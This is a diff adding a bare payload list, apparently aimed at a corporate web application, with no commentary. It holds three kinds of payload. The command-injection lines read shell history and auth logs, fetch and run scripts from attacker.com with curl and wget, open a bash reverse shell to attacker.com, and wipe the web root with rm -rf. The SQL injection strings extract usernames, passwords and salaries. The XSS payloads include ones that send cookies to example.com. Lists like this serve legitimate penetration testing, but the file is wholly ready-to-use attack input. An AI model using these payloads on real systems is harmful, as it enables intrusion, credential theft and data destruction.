@@ -1,0 +1,151 @@
+; ls
+| ls
+&& ls
+`ls`
+; cat /var/www/corp/.bash_history
+| cat /var/www/corp/.bash_history
+&& cat /var/www/corp/.bash_history
+`cat /var/www/corp/.bash_history`
+; id
+| id
+&& id
+`id`
+; whoami
+| whoami
+&& whoami
+`whoami`
+; ping -c 4 127.0.0.1
+| ping -c 4 127.0.0.1
+&& ping -c 4 127.0.0.1
+`ping -c 4 127.0.0.1`
+; uname -a
+| uname -a
+&& uname -a
+`uname -a`
+; nc -lvp 1234
+| nc -lvp 1234
+&& nc -lvp 1234
+`nc -lvp 1234`
+; curl http://attacker.com/malicious_script.sh | sh
+| curl http://attacker.com/malicious_script.sh | sh
+&& curl http://attacker.com/malicious_script.sh | sh
+`curl http://attacker.com/malicious_script.sh | sh`
+; wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh
+| wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh
+&& wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh
+`wget http://attacker.com/malicious_script.sh -O /tmp/malicious_script.sh; sh /tmp/malicious_script.sh`
+; echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh
+| echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh
+&& echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh
+`echo "malicious_code" > /tmp/malicious.sh; sh /tmp/malicious.sh`
+; bash -i >& /dev/tcp/attacker.com/1234 0>&1
+| bash -i >& /dev/tcp/attacker.com/1234 0>&1
+&& bash -i >& /dev/tcp/attacker.com/1234 0>&1
+`bash -i >& /dev/tcp/attacker.com/1234 0>&1`
+; rm -rf /var/www/corp/*
+| rm -rf /var/www/corp/*
+&& rm -rf /var/www/corp/*
+`rm -rf /var/www/corp/*`
+; cat /var/log/auth.log
+| cat /var/log/auth.log
+
+' OR 1=1 --
+' OR 'a'='a' --
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL, employee_name, employee_email FROM employees --
+' UNION SELECT NULL, department_name, department_head FROM departments --
+' UNION SELECT NULL, project_name, project_manager FROM projects --
+' UNION SELECT NULL, salary, employee_id FROM salaries --
+' UNION SELECT NULL, username, password FROM users --
+' UNION SELECT NULL, table_name FROM information_schema.tables --
+' OR EXISTS(SELECT * FROM employees WHERE employee_id=1) --
+' AND 1=1 --
+' AND 'a'='a' --
+' UNION SELECT NULL, project_name, project_budget FROM projects --
+' UNION SELECT NULL, employee_name, employee_salary FROM employees WHERE department='HR' --
+' UNION SELECT NULL, email, employee_role FROM employees --
+' UNION SELECT NULL, employee_name, salary FROM employees WHERE department='Engineering' --
+' AND 1=1 ORDER BY 1 --
+' AND 1=1 GROUP BY NULL --
+' UNION SELECT NULL, employee_name, job_title FROM employees WHERE employee_id=101 --
+' UNION SELECT NULL, project_name, project_status FROM projects WHERE project_id=1 --
+' UNION SELECT NULL, username, email, role FROM users WHERE user_role='admin' --
+' UNION SELECT NULL, group_concat(employee_name, ':', employee_email) FROM employees --
+' OR 1=1 AND SELECT user() --
+' OR 1=1 AND SELECT database() --
+' UNION SELECT NULL, order_id, total_amount FROM orders --
+' AND 1=1 LIMIT 1,1 --
+' UNION SELECT NULL, username, password FROM users WHERE user_role='admin' --
+' UNION SELECT NULL, department_name, department_budget FROM departments --
+' UNION SELECT NULL, contact_name, contact_email FROM contact_us --
+' OR 1=1 AND SLEEP(5) --
+' UNION SELECT NULL, project_name, employee_name FROM project_assignments --
+' UNION SELECT NULL, employee_name, department_name FROM employees JOIN departments ON employees.department_id = departments.department_id --
+' OR 1=1 AND SELECT table_name FROM information_schema.tables --
+' UNION SELECT NULL, employee_name, project_id FROM employee_projects --
+' UNION SELECT NULL, email, department_name FROM employees WHERE department_id=1 --
+' UNION SELECT NULL, department_name, manager_name FROM departments --
+' OR 1=1 AND SELECT * FROM users WHERE user_role='staff' --
+' UNION SELECT NULL, project_name, client_name FROM projects WHERE project_id=5 --
+' UNION SELECT NULL, employee_name, company_phone FROM employees --
+' OR 'a'='a' AND SELECT table_name FROM information_schema.tables --
+' UNION SELECT NULL, product_name, product_price FROM products --
+' UNION SELECT NULL, product_id, product_name, price FROM inventory --
+' AND 1=1 AND SELECT * FROM employees --
+' UNION SELECT NULL, username, email FROM users WHERE employee_id=101 --
+' UNION SELECT NULL, employee_name, department_name FROM employees JOIN departments ON employees.department_id = departments.department_id WHERE departments.department_name='Sales' --
+' UNION SELECT NULL, employee_id, project_id FROM employee_projects WHERE employee_id=1001 --
+' UNION SELECT NULL, product_name, product_description FROM products WHERE category='Electronics' --
+' OR (SELECT COUNT(*) FROM projects) > 1 --
+' UNION SELECT NULL, employee_name, project_title FROM employees JOIN projects ON employees.employee_id = projects.project_manager_id --
+' OR 1=1 AND SELECT * FROM employees WHERE employee_role='manager' --
+<script>alert('XSS in Corporate Site')</script>
+<img src="x" onerror="alert('XSS in Corporate Site')">
+<a href="javascript:alert('XSS in Corporate Site')">Click here</a>
+<div onmouseover="alert('XSS in Corporate Site')">Hover over me</div>
+<script>eval('alert("XSS in Corporate Site")')</script>
+<input type="text" value="<script>alert('XSS in Corporate Site')</script>">
+<iframe src="javascript:alert('XSS in Corporate Site');"></iframe>
+<svg/onload=alert('XSS in Corporate Site')>
+<script>document.location='javascript:alert("XSS in Corporate Site")'</script>
+<script>window.location="javascript:alert('XSS in Corporate Site')"</script>
+<form action="javascript:alert('XSS in Corporate Site')"></form>
+<img src="invalid" onerror="alert('XSS in Corporate Site')">
+<input type="button" value="Click me" onclick="alert('XSS in Corporate Site')">
+<button onclick="alert('XSS in Corporate Site')">Click me</button>
+<textarea onfocus="alert('XSS in Corporate Site')"></textarea>
+<input type="text" value="<img src=x onerror=alert('XSS in Corporate Site')>">
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS in Corporate Site')">
+<object data="javascript:alert('XSS in Corporate Site')"></object>
+<audio src="javascript:alert('XSS in Corporate Site')"></audio>
+<input type="image" src="x" onerror="alert('XSS in Corporate Site')">
+<script>setTimeout('alert("XSS in Corporate Site")', 100)</script>
+<script>window.alert('XSS in Corporate Site');</script>
+<input type="file" onchange="alert('XSS in Corporate Site')">
+<script>fetch('http://example.com?cookie=' + document.cookie)</script>
+<div style="width: expression(alert('XSS in Corporate Site'));">
+<script>window.alert(document.cookie)</script>
+<script>document.cookie="CorporateXSS=" + encodeURIComponent('test');</script>
+<script>new Image().src='javascript:alert("XSS in Corporate Site")'</script>
+<script>document.body.innerHTML = '<img src=x onerror=alert("XSS in Corporate Site")>';</script>
+<script>var img = new Image(); img.src = "http://example.com?cookie=" + document.cookie;</script>
+<script>document.body.innerHTML = '<iframe src="javascript:alert(\'XSS in Corporate Site\')"></iframe>';</script>
+<input onfocus="alert('XSS in Corporate Site')" autofocus>
+<video onplay="alert('XSS in Corporate Site')"></video>
+<form action="javascript:alert('XSS in Corporate Site')" method="POST"></form>
+<a href="javascript:document.location='javascript:alert(1)'">Go to Page</a>
+<textarea onblur="alert('XSS in Corporate Site')"></textarea>
+<script>var x = document.createElement('script'); x.src = 'javascript:alert("XSS in Corporate Site")'; document.body.appendChild(x);</script>
+<script>eval('alert("XSS in Corporate Site")')</script>
+<input type="text" value="Corporate <img src='x' onerror='alert(1)'>">
+<script>eval('alert(document.cookie)')</script>
+<img src="x" onerror="this.src='http://example.com/evil.jpg'">
+<style>@import 'javascript:alert(2)';</style>
+<button onclick="location='javascript:alert(3)'">Click Me</button>
+<form action="javascript:alert('XSS in Corporate Site')" method="POST"></form>
+<audio controls autoplay><source src="javascript:alert('XSS in Corporate Site')"></audio>
+<script>document.body.innerHTML = '<img src="x" onerror="alert(\'XSS\')">';</script>
+<script>location='javascript:alert("XSS in Corporate Site")'</script>
+<script>window.location="javascript:alert('XSS in Corporate Site')"</script>
+<input type="text" value="<svg><script>alert('XSS in Corporate Site')</script></svg>">
+<script>window.alert('XSS in Corporate Site')</script>
